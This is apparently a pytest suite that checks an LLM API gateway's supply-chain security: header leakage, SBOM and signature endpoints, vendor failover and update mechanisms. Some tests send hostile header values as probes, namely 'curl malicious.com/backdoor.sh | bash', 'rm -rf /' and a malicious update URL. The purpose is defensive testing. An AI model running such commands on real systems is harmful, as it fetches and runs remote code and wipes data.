# Section 7.3 - Supply Chain Security Tests
# Based on: docs/test_design_n_planning/Testcases_7_3_Security Testing/Test Cases for Supply Chain Security.md

import pytest
import httpx
import asyncio
import json
import hashlib
from typing import Dict, Any, List
from urllib.parse import urlparse

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from config import config, logger
from fixtures.auth_fixtures import AuthFixtures
from utils.security_validators import SecurityValidator


class TestSupplyChainSecurity:
    """Comprehensive supply chain security tests"""
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_dependency_validation_001(self, http_client: httpx.AsyncClient,
                                           auth_headers: Dict[str, str],
                                           make_request):
        """SUPPLY_CHAIN_DEPS_001: Dependency vulnerability validation"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test API behavior to infer dependency security
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for vulnerable dependency indicators in headers
        dependency_headers = [
            "server",
            "x-powered-by", 
            "x-framework",
            "x-runtime-version"
        ]
        
        vulnerable_patterns = [
            "apache/2.4.49",  # Known vulnerable version
            "nginx/1.18.0",   # Example vulnerable version
            "express/4.16.0", # Example vulnerable version
            "flask/1.0.0",    # Example vulnerable version
        ]
        
        for header in dependency_headers:
            header_value = headers.get(header, "").lower()
            if header_value:
                for pattern in vulnerable_patterns:
                    if pattern in header_value:
                        logger.warning(f"Potentially vulnerable dependency: {header}={header_value}")
        
        # Test for dependency confusion attacks
        confusion_test_headers = auth_headers.copy()
        confusion_test_headers["X-Package-Source"] = "malicious-registry"
        
        confusion_response = await make_request(
            http_client, "GET", "/api/v1/models",
            confusion_test_headers, track_cost=False
        )
        
        # Should not be affected by malicious package indicators
        assert confusion_response.status_code == 200
        
        logger.info("SUPPLY_CHAIN_DEPS_001: Dependency validation completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_provider_sdk_integrity_001(self, http_client: httpx.AsyncClient,
                                            auth_headers: Dict[str, str],
                                            make_request):
        """SUPPLY_CHAIN_SDK_001: Provider SDK integrity validation"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test different provider models for SDK integrity
        test_models = config.CHAT_MODELS[:3]  # Test first 3 models
        
        for model in test_models:
            request = {
                "model": model,
                "messages": [{"role": "user", "content": f"SDK integrity test for {model}"}],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request
            )
            
            if response.status_code == 200:
                response_data = response.json()
                
                # Verify response structure integrity
                assert "choices" in response_data
                assert "model" in response_data
                assert len(response_data["choices"]) > 0
                
                # Check for SDK tampering indicators
                response_text = str(response_data).lower()
                tampering_indicators = [
                    "sdk_modified",
                    "injected_code",
                    "backdoor",
                    "malicious_payload",
                    "compromised_sdk"
                ]
                
                for indicator in tampering_indicators:
                    assert indicator not in response_text, \
                        f"SDK tampering indicator detected: {indicator}"
                
                # Verify model name consistency
                returned_model = response_data.get("model", "")
                if returned_model and returned_model != model:
                    logger.warning(f"Model name mismatch: requested {model}, got {returned_model}")
                
            elif response.status_code == 422:
                logger.info(f"Model {model} not available - acceptable")
            else:
                logger.warning(f"Unexpected response for model {model}: {response.status_code}")
        
        logger.info("SUPPLY_CHAIN_SDK_001: Provider SDK integrity validated")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_container_security_001(self, http_client: httpx.AsyncClient,
                                        auth_headers: Dict[str, str],
                                        make_request):
        """SUPPLY_CHAIN_CONTAINER_001: Container base image security"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test container security through API metadata
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for container security indicators
        container_security_headers = [
            "x-container-version",
            "x-base-image",
            "x-dockerfile-hash",
            "x-image-digest"
        ]
        
        exposed_container_info = []
        for header in container_security_headers:
            if header in headers:
                exposed_container_info.append(f"{header}={headers[header]}")
        
        if exposed_container_info:
            logger.warning(f"Container information exposed: {exposed_container_info}")
        else:
            logger.info("Container information properly concealed")
        
        # Test for vulnerable base image indicators
        server_header = headers.get("server", "").lower()
        vulnerable_base_images = [
            "alpine:3.11",    # Example vulnerable version
            "ubuntu:18.04",   # Example old version
            "debian:9",       # Example old version
            "node:14.15.0",   # Example vulnerable version
        ]
        
        for vuln_image in vulnerable_base_images:
            if vuln_image in server_header:
                logger.warning(f"Potentially vulnerable base image detected: {vuln_image}")
        
        # Test container escape attempts
        escape_headers = auth_headers.copy()
        escape_headers["X-Container-Escape"] = "privileged"
        escape_headers["X-Host-Mount"] = "/proc/self/root"
        
        escape_response = await make_request(
            http_client, "GET", "/api/v1/models",
            escape_headers, track_cost=False
        )
        
        # Should handle container escape attempts gracefully
        assert escape_response.status_code in [200, 400], \
            "Container should handle escape attempts"
        
        logger.info("SUPPLY_CHAIN_CONTAINER_001: Container security validated")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_cicd_security_001(self, http_client: httpx.AsyncClient,
                                   auth_headers: Dict[str, str],
                                   make_request):
        """SUPPLY_CHAIN_CICD_001: CI/CD pipeline security validation"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test CI/CD security through deployment artifacts
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for CI/CD information leakage
        cicd_headers = [
            "x-build-id",
            "x-commit-hash", 
            "x-pipeline-id",
            "x-deploy-time",
            "x-build-number",
            "x-git-branch",
            "x-jenkins-build",
            "x-github-actions",
            "x-gitlab-ci"
        ]
        
        exposed_cicd_info = []
        for header in cicd_headers:
            if header in headers:
                exposed_cicd_info.append(f"{header}={headers[header]}")
        
        if exposed_cicd_info:
            logger.warning(f"CI/CD information exposed: {exposed_cicd_info}")
        else:
            logger.info("CI/CD information properly concealed")
        
        # Test for CI/CD injection attempts
        injection_headers = auth_headers.copy()
        injection_headers["X-CI-Inject"] = "curl malicious.com/backdoor.sh | bash"
        injection_headers["X-Build-Override"] = "rm -rf /"
        
        injection_response = await make_request(
            http_client, "GET", "/api/v1/models",
            injection_headers, track_cost=False
        )
        
        # Should handle CI/CD injection attempts
        assert injection_response.status_code in [200, 400], \
            "API should handle CI/CD injection attempts"
        
        logger.info("SUPPLY_CHAIN_CICD_001: CI/CD security validated")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_sbom_validation_001(self, http_client: httpx.AsyncClient,
                                     auth_headers: Dict[str, str],
                                     make_request):
        """SUPPLY_CHAIN_SBOM_001: Software Bill of Materials validation"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test SBOM endpoints (if available)
        sbom_endpoints = [
            "/.well-known/sbom",
            "/sbom.json",
            "/api/v1/sbom",
            "/security/sbom",
            "/_/sbom"
        ]
        
        sbom_found = False
        
        for endpoint in sbom_endpoints:
            response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if response.status_code == 200:
                sbom_found = True
                logger.info(f"SBOM found at: {endpoint}")
                
                try:
                    sbom_data = response.json()
                    
                    # Validate SBOM structure
                    required_fields = ["bomFormat", "components", "metadata"]
                    for field in required_fields:
                        if field not in sbom_data:
                            logger.warning(f"SBOM missing required field: {field}")
                    
                    # Check for component vulnerabilities (if available)
                    components = sbom_data.get("components", [])
                    for component in components[:5]:  # Check first 5 components
                        name = component.get("name", "")
                        version = component.get("version", "")
                        
                        # Look for known vulnerable components
                        vulnerable_components = [
                            ("jackson-databind", "2.9.10"),
                            ("log4j-core", "2.14.1"),
                            ("spring-core", "5.3.8"),
                            ("lodash", "4.17.20")
                        ]
                        
                        for vuln_name, vuln_version in vulnerable_components:
                            if name == vuln_name and version <= vuln_version:
                                logger.warning(f"Potentially vulnerable component: {name}@{version}")
                
                except json.JSONDecodeError:
                    logger.warning(f"Invalid JSON in SBOM at {endpoint}")
                
            elif response.status_code == 404:
                logger.info(f"SBOM not found at: {endpoint}")
            elif response.status_code in [401, 403]:
                logger.info(f"SBOM access restricted at: {endpoint}")
        
        if not sbom_found:
            logger.info("No SBOM endpoints found - consider implementing for transparency")
        
        logger.info("SUPPLY_CHAIN_SBOM_001: SBOM validation completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_artifact_signing_001(self, http_client: httpx.AsyncClient,
                                      auth_headers: Dict[str, str],
                                      make_request):
        """SUPPLY_CHAIN_SIGNING_001: Artifact signing validation"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test artifact signing through API responses
        response = await make_request(
            http_client, "GET", "/api/v1/models",
            auth_headers, track_cost=False
        )
        
        assert response.status_code == 200
        headers = response.headers
        
        # Check for artifact signing headers
        signing_headers = [
            "x-artifact-signature",
            "x-code-signature",
            "x-image-signature",
            "x-manifest-digest",
            "x-cosign-signature"
        ]
        
        signing_indicators = []
        for header in signing_headers:
            if header in headers:
                signing_indicators.append(header)
        
        if signing_indicators:
            logger.info(f"Artifact signing detected: {signing_indicators}")
        else:
            logger.info("No artifact signing headers found")
        
        # Test signature validation endpoints
        signature_endpoints = [
            "/signatures/verify",
            "/.well-known/cosign",
            "/api/v1/signatures",
            "/security/signatures"
        ]
        
        for endpoint in signature_endpoints:
            sig_response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if sig_response.status_code == 200:
                logger.info(f"Signature endpoint available: {endpoint}")
            elif sig_response.status_code == 404:
                logger.info(f"Signature endpoint not found: {endpoint}")
        
        logger.info("SUPPLY_CHAIN_SIGNING_001: Artifact signing validated")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_vendor_risk_001(self, http_client: httpx.AsyncClient,
                                 auth_headers: Dict[str, str],
                                 make_request):
        """SUPPLY_CHAIN_VENDOR_001: Vendor risk assessment"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test vendor risk through API behavior and metadata
        vendor_test_scenarios = [
            {
                "description": "Primary provider test",
                "model": config.get_chat_model(0),
                "risk_level": "low"
            }
        ]
        
        # Add additional models if available
        if len(config.CHAT_MODELS) > 1:
            vendor_test_scenarios.append({
                "description": "Secondary provider test",
                "model": config.get_chat_model(1),
                "risk_level": "medium"
            })
        
        vendor_responses = []
        
        for scenario in vendor_test_scenarios:
            request = {
                "model": scenario["model"],
                "messages": [{"role": "user", "content": f"Vendor risk test for {scenario['description']}"}],
                "max_tokens": 50
            }
            
            response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                auth_headers, request
            )
            
            vendor_responses.append({
                "scenario": scenario["description"],
                "model": scenario["model"],
                "status_code": response.status_code,
                "risk_level": scenario["risk_level"]
            })
            
            if response.status_code == 200:
                response_data = response.json()
                
                # Check for vendor information leakage
                response_text = str(response_data).lower()
                vendor_indicators = [
                    "openai",
                    "anthropic",
                    "google",
                    "microsoft",
                    "amazon",
                    "api_key",
                    "vendor_secret"
                ]
                
                for indicator in vendor_indicators:
                    if indicator in response_text:
                        logger.warning(f"Vendor information leakage: {indicator} in {scenario['description']}")
        
        # Analyze vendor diversification
        successful_vendors = [r for r in vendor_responses if r["status_code"] == 200]
        
        if len(successful_vendors) > 1:
            logger.info("Multiple vendor support detected - good for supply chain resilience")
        else:
            logger.warning("Single vendor dependency - consider diversification")
        
        # Test vendor failover capability
        if len(successful_vendors) > 1:
            # Simulate primary vendor failure
            failover_headers = auth_headers.copy()
            failover_headers["X-Primary-Vendor-Down"] = "true"
            
            failover_request = {
                "model": config.get_chat_model(0),
                "messages": [{"role": "user", "content": "Vendor failover test"}],
                "max_tokens": 50
            }
            
            failover_response = await make_request(
                http_client, "POST", "/api/v1/chat/completions",
                failover_headers, failover_request
            )
            
            if failover_response.status_code == 200:
                logger.info("Vendor failover capability detected")
            else:
                logger.warning("Vendor failover may not be implemented")
        
        logger.info("SUPPLY_CHAIN_VENDOR_001: Vendor risk assessment completed")
    
    @pytest.mark.security
    @pytest.mark.asyncio
    async def test_update_security_001(self, http_client: httpx.AsyncClient,
                                     auth_headers: Dict[str, str],
                                     make_request):
        """SUPPLY_CHAIN_UPDATE_001: Update mechanism security"""
        if not config.should_run_security_tests():
            pytest.skip("Security tests disabled")
        
        # Test update-related endpoints and security
        update_endpoints = [
            "/updates",
            "/api/v1/updates",
            "/system/updates", 
            "/admin/updates",
            "/maintenance"
        ]
        
        for endpoint in update_endpoints:
            response = await make_request(
                http_client, "GET", endpoint,
                auth_headers, track_cost=False
            )
            
            if response.status_code == 200:
                logger.warning(f"Update endpoint accessible: {endpoint}")
                
                # Check for update security
                try:
                    update_data = response.json()
                    
                    # Look for insecure update mechanisms
                    insecure_indicators = [
                        "http://",  # Unencrypted updates
                        "no_signature",
                        "skip_verification",
                        "auto_update_enabled"
                    ]
                    
                    update_text = str(update_data).lower()
                    for indicator in insecure_indicators:
                        if indicator in update_text:
                            logger.warning(f"Insecure update mechanism: {indicator}")
                            
                except json.JSONDecodeError:
                    logger.info(f"Update endpoint returns non-JSON: {endpoint}")
                    
            elif response.status_code == 404:
                logger.info(f"Update endpoint not found: {endpoint}")
            elif response.status_code in [401, 403]:
                logger.info(f"Update endpoint properly protected: {endpoint}")
        
        # Test update injection attempts
        injection_headers = auth_headers.copy()
        injection_headers["X-Update-Source"] = "http://malicious.com/backdoor.tar.gz"
        injection_headers["X-Force-Update"] = "true"
        
        injection_response = await make_request(
            http_client, "GET", "/api/v1/models",
            injection_headers, track_cost=False
        )
        
        # Should not be affected by update injection
        assert injection_response.status_code == 200
        
        logger.info("SUPPLY_CHAIN_UPDATE_001: Update security validated")


# Advanced Supply Chain Security tests moved to test_supply_chain_advanced.py to maintain file size under 900 lines